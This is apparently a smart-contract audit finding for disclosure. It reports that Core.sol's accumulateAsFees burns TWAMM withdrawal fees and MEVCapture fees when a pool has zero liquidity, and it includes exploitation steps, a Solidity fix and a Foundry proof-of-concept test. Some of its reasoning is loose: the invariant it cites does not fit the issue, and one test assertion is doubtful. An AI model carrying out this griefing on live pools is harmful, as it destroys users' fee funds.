## Title
Fee Burning Griefing Attack on Pools with Zero Liquidity Wastes User Funds

## Summary
The `accumulateAsFees` function in Core.sol allows extensions to accumulate fees even when pool liquidity is zero, causing these fees to be permanently burned (not distributed to any LP). This affects TWAMM withdrawal fees and MEVCapture accumulated fees, resulting in direct loss of user funds without any beneficiary.

## Impact
**Severity**: Medium

## Finding Description

**Location:** `src/Core.sol` - `accumulateAsFees` function (lines 228-276) [1](#0-0) 

**Intended Logic:** Extensions should be able to accumulate swap fees or withdrawal fees as rewards for liquidity providers by calling `accumulateAsFees`. The function distributes these fees proportionally to all LPs based on their liquidity share.

**Actual Logic:** When pool liquidity is zero, the function explicitly skips fee distribution (lines 254-268), but still increases the extension's debt. This means:
1. The extension owes tokens to Core (debt increases)
2. Those tokens are NOT distributed to any LP (because liquidity = 0)
3. The tokens remain in Core contract but are unaccounted for (permanently lost)

The comment on lines 241-242 acknowledges this behavior: [2](#0-1) 

**Exploitation Path:**

**Scenario 1 - TWAMM Withdrawal Fee Burning:**

1. **Setup**: Pool has liquidity, user places TWAMM order
2. **Attack**: Malicious LP removes all liquidity from pool (or waits for natural depletion)
3. **User Action**: User attempts to cancel/withdraw from TWAMM order via `updateOrder`
4. **Fee Calculation**: TWAMM charges withdrawal fee (lines 318-328 in TWAMM.sol) [3](#0-2) 
5. **Fee Burned**: Since liquidity=0, `accumulateAsFees` does not distribute the fee
6. **Debt Settlement**: Extension settles debt using saved balances, but fee is lost forever
7. **Result**: User pays withdrawal fee, but no LP receives it - tokens permanently locked in Core

**Scenario 2 - MEVCapture Fee Burning:**

1. **Setup**: MEVCapture accumulates fees from swaps while pool has liquidity
2. **Attack**: All LPs remove liquidity before fee distribution
3. **Trigger**: `accumulatePoolFees` is called in next block (lines 105-155 in MEVCapture.sol) [4](#0-3) 
4. **Fee Distribution Attempt**: MEVCapture calls `accumulateAsFees` with accumulated fees [5](#0-4) 
5. **Fee Burned**: Since liquidity=0, fees are not distributed to any LP
6. **Result**: Accumulated swap fees from previous block are permanently lost

**Security Property Broken:** 
- **Fee Accounting Invariant**: "Position fee collection must be accurate and never allow double-claiming" - This is violated because fees are collected but never distributed, resulting in permanent loss rather than proper accounting
- Users suffer direct financial harm (loss of withdrawal fees or swap fee rewards)

## Impact Explanation

**Affected Assets:**
- **TWAMM**: User withdrawal fees (can be significant for large orders)
- **MEVCapture**: Accumulated swap fees from all swaps in previous blocks
- Both token0 and token1 can be affected

**Damage Severity:**
- **Per-incident loss**: Equals the fee amount that should have been distributed
- **TWAMM withdrawal fee**: Computed as `computeFee(withdrawAmount, poolFee)` - typically 0.01% to 1% of withdrawal amount
- **MEVCapture fees**: All accumulated swap fees from the previous block's trading activity
- **Permanent loss**: Tokens are locked in Core contract with no recovery mechanism
- **No beneficiary**: Pure griefing - attacker doesn't profit, fees are simply wasted

**User Impact:**
- **TWAMM users**: Lose withdrawal fees when canceling/modifying orders
- **LPs**: Lose accumulated swap fee rewards that should have been distributed
- **Frequency**: Every time a fee-generating action occurs when liquidity = 0

## Likelihood Explanation

**Attacker Profile:**
- Any LP who can remove liquidity
- Or natural market conditions where all LPs exit
- Requires coordination if multiple LPs exist, or single large LP

**Preconditions:**
- Pool must be initialized (but can have liquidity = 0)
- For TWAMM: Active TWAMM orders exist
- For MEVCapture: Accumulated fees exist in saved balances
- Liquidity can be removed through normal `withdraw` operations on positions

**Execution Complexity:**
- **TWAMM attack**: Front-run user's TWAMM order cancellation by removing liquidity
- **MEVCapture attack**: Remove liquidity at end of block, fees burned on next block's first interaction
- Single transaction for liquidity removal
- No special privileges required

**Frequency:**
- Can occur whenever pool liquidity reaches zero
- More likely in low-liquidity pools or newly launched pools
- Repeatable: Each fee-generating action when liquidity = 0 results in burned fees

## Recommendation

**Fix:** Add a check to prevent fee accumulation when liquidity is zero:

```solidity
// In src/Core.sol, function accumulateAsFees, line 244:

// CURRENT (vulnerable):
if (amount0 != 0 || amount1 != 0) {
    uint256 liquidity;
    {
        uint128 _liquidity = readPoolState(poolId).liquidity();
        assembly ("memory-safe") {
            liquidity := _liquidity
        }
    }

    unchecked {
        if (liquidity != 0) {
            // distribute fees...
        }
    }
}
// Debt is always updated regardless of liquidity

// FIXED:
if (amount0 != 0 || amount1 != 0) {
    uint256 liquidity;
    {
        uint128 _liquidity = readPoolState(poolId).liquidity();
        assembly ("memory-safe") {
            liquidity := _liquidity
        }
    }

    // Revert if trying to accumulate fees when no liquidity exists
    if (liquidity == 0) {
        revert CannotAccumulateFeesWithZeroLiquidity();
    }

    unchecked {
        // distribute fees...
        StorageSlot slot0 = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);
        
        if (amount0 != 0) {
            slot0.store(
                bytes32(uint256(slot0.load()) + FixedPointMathLib.rawDiv(amount0 << 128, liquidity))
            );
        }
        if (amount1 != 0) {
            StorageSlot slot1 = slot0.next();
            slot1.store(
                bytes32(uint256(slot1.load()) + FixedPointMathLib.rawDiv(amount1 << 128, liquidity))
            );
        }
    }
}
```

**Alternative Mitigation:** Extensions (TWAMM, MEVCapture) could check pool liquidity before calling `accumulateAsFees` and skip fee accumulation if liquidity is zero. However, this is less robust as it requires each extension to implement the check.

## Proof of Concept

```solidity
// File: test/Exploit_FeeBurningZeroLiquidity.t.sol
// Run with: forge test --match-test test_FeeBurningZeroLiquidity -vvv

pragma solidity ^0.8.31;

import {FullTest} from "./FullTest.sol";
import {TWAMM, twammCallPoints} from "../src/extensions/TWAMM.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {createFullRangePoolConfig} from "../src/types/poolConfig.sol";
import {createOrderConfig} from "../src/types/orderConfig.sol";
import {OrderKey} from "../src/interfaces/extensions/ITWAMM.sol";

contract Exploit_FeeBurningZeroLiquidity is FullTest {
    TWAMM internal twamm;
    PoolKey internal poolKey;
    uint256 internal lpPositionId;
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function setUp() public override {
        FullTest.setUp();
        
        // Deploy TWAMM extension
        address deployAddress = address(uint160(twammCallPoints().toUint8()) << 152);
        deployCodeTo("TWAMM.sol", abi.encode(core), deployAddress);
        twamm = TWAMM(deployAddress);
        
        // Create pool with TWAMM extension
        poolKey = createPool(address(token0), address(token1), 0, createFullRangePoolConfig(100, address(twamm)));
        
        // Setup: LP provides liquidity
        token0.mint(address(this), 1000e18);
        token1.mint(address(this), 1000e18);
        (lpPositionId,) = createPosition(poolKey, -887272, 887272, 100e18, 100e18);
        
        // Setup: Victim places TWAMM order
        token0.mint(victim, 10e18);
        vm.startPrank(victim);
        token0.approve(address(twamm), 10e18);
        twamm.updateOrder(
            poolKey,
            OrderKey({owner: victim, salt: bytes32(0), config: createOrderConfig(false, uint32(block.timestamp), uint32(block.timestamp + 1000))}),
            int112(int256(10e18))
        );
        vm.stopPrank();
    }

    function test_FeeBurningZeroLiquidity() public {
        // SETUP: Record initial balances
        uint256 victimBalance0Before = token0.balanceOf(victim);
        uint256 coreBalance0Before = token0.balanceOf(address(core));
        
        // ATTACK: Attacker (or any LP) removes ALL liquidity
        positions.withdraw(lpPositionId, type(uint128).max, 0, 0, true);
        
        // Verify pool now has zero liquidity
        (, , uint128 liquidity) = core.poolState(poolKey.toPoolId()).parse();
        assertEq(liquidity, 0, "Pool should have zero liquidity");
        
        // EXPLOIT: Victim cancels TWAMM order (triggers withdrawal fee)
        vm.warp(block.timestamp + 500);
        vm.startPrank(victim);
        
        // Cancel the order by setting sale rate to 0
        twamm.updateOrder(
            poolKey,
            OrderKey({owner: victim, salt: bytes32(0), config: createOrderConfig(false, uint32(block.timestamp - 500), uint32(block.timestamp + 500))}),
            -int112(int256(10e18))
        );
        vm.stopPrank();
        
        // VERIFY: Victim paid withdrawal fee, but no LP received it
        uint256 victimBalance0After = token0.balanceOf(victim);
        uint256 coreBalance0After = token0.balanceOf(address(core));
        
        // Victim received less than their full order amount (fee was charged)
        uint256 victimReceived = victimBalance0After - victimBalance0Before;
        assertLt(victimReceived, 5e18, "Victim should receive less than half of order due to fee");
        
        // Core balance increased (fee was collected)
        uint256 coreGained = coreBalance0After - coreBalance0Before;
        assertGt(coreGained, 0, "Core should have gained tokens from burned fee");
        
        // The fee is now permanently stuck in Core - cannot be withdrawn by anyone
        // No LP can claim it because liquidity was 0 when fees were accumulated
        
        console.log("Victim withdrew:", victimReceived);
        console.log("Fee burned in Core:", coreGained);
        console.log("Vulnerability confirmed: Fee permanently lost, no LP can claim it");
    }
}
```

## Notes

This vulnerability is explicitly documented in the code comments (lines 241-242 of Core.sol), suggesting it may be a known design tradeoff. However, it violates the Fee Accounting invariant and causes **direct financial harm to users** through:

1. **TWAMM users** paying withdrawal fees that disappear into the void
2. **LPs** losing accumulated swap fee rewards when liquidity temporarily drops to zero

The issue is particularly problematic because:
- **Permanent loss**: No recovery mechanism exists for burned fees
- **Pure griefing**: Attacker doesn't profit, making it economically irrational but technically possible
- **Affects in-scope extensions**: Both TWAMM and MEVCapture (in-scope) are vulnerable
- **Can occur naturally**: Doesn't require malicious intent - normal market conditions where all LPs exit will trigger this

The severity is **Medium** because while it causes direct loss of user funds, it requires specific preconditions (liquidity = 0) and doesn't constitute theft (no one gains the funds). It's a griefing attack with real financial impact on users.

### Citations

**File:** src/Core.sol (L228-276)
```text
    function accumulateAsFees(PoolKey memory poolKey, uint128 _amount0, uint128 _amount1) external payable {
        (uint256 id, address lockerAddr) = _requireLocker().parse();
        require(lockerAddr == poolKey.config.extension());

        PoolId poolId = poolKey.toPoolId();

        uint256 amount0;
        uint256 amount1;
        assembly ("memory-safe") {
            amount0 := _amount0
            amount1 := _amount1
        }

        // Note we do not check pool is initialized. If the extension calls this for a pool that does not exist,
        //  the fees are simply burned since liquidity is 0.

        if (amount0 != 0 || amount1 != 0) {
            uint256 liquidity;
            {
                uint128 _liquidity = readPoolState(poolId).liquidity();
                assembly ("memory-safe") {
                    liquidity := _liquidity
                }
            }

            unchecked {
                if (liquidity != 0) {
                    StorageSlot slot0 = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);

                    if (amount0 != 0) {
                        slot0.store(
                            bytes32(uint256(slot0.load()) + FixedPointMathLib.rawDiv(amount0 << 128, liquidity))
                        );
                    }
                    if (amount1 != 0) {
                        StorageSlot slot1 = slot0.next();
                        slot1.store(
                            bytes32(uint256(slot1.load()) + FixedPointMathLib.rawDiv(amount1 << 128, liquidity))
                        );
                    }
                }
            }
        }

        // whether the fees are actually accounted to any position, the caller owes the debt
        _updatePairDebtWithNative(id, poolKey.token0, poolKey.token1, int256(amount0), int256(amount1));

        emit FeesAccumulated(poolId, _amount0, _amount1);
    }
```

**File:** src/extensions/TWAMM.sol (L318-328)
```text
                // user is withdrawing tokens, so they need to pay a fee to the liquidity providers
                if (amountDelta < 0) {
                    // negation and downcast will never overflow, since max sale rate times max duration is at most type(uint112).max
                    uint128 fee = computeFee(uint128(uint256(-amountDelta)), poolKey.config.fee());
                    if (isToken1) {
                        CORE.accumulateAsFees(poolKey, 0, fee);
                        CORE.updateSavedBalances(poolKey.token0, poolKey.token1, bytes32(0), 0, amountDelta);
                    } else {
                        CORE.accumulateAsFees(poolKey, fee, 0);
                        CORE.updateSavedBalances(poolKey.token0, poolKey.token1, bytes32(0), amountDelta, 0);
                    }
```

**File:** src/extensions/MEVCapture.sol (L105-155)
```text
    function accumulatePoolFees(PoolKey memory poolKey) public {
        PoolId poolId = poolKey.toPoolId();
        MEVCapturePoolState state = getPoolState(poolId);

        // the only thing we lock for is accumulating fees when the pool has not been updated in this block
        if (state.lastUpdateTime() != uint32(block.timestamp)) {
            address target = address(CORE);
            assembly ("memory-safe") {
                let o := mload(0x40)
                mstore(o, shl(224, 0xf83d08ba))
                mcopy(add(o, 4), poolKey, 96)
                mstore(add(o, 100), poolId)

                // If the call failed, pass through the revert
                if iszero(call(gas(), target, 0, o, 132, 0, 0)) {
                    returndatacopy(o, 0, returndatasize())
                    revert(o, returndatasize())
                }
            }
        }
    }

    function locked_6416899205(uint256) external onlyCore {
        PoolKey memory poolKey;
        PoolId poolId;
        assembly ("memory-safe") {
            // copy the poolkey out of calldata
            calldatacopy(poolKey, 36, 96)
            poolId := calldataload(132)
        }

        (int32 tick, uint128 fees0, uint128 fees1) = loadCoreState(poolId, poolKey.token0, poolKey.token1);

        if (fees0 != 0 || fees1 != 0) {
            CORE.accumulateAsFees(poolKey, fees0, fees1);
            unchecked {
                CORE.updateSavedBalances(
                    poolKey.token0,
                    poolKey.token1,
                    PoolId.unwrap(poolId),
                    -int256(uint256(fees0)),
                    -int256(uint256(fees1))
                );
            }
        }

        setPoolState({
            poolId: poolId,
            state: createMEVCapturePoolState({_lastUpdateTime: uint32(block.timestamp), _tickLast: tick})
        });
    }
```
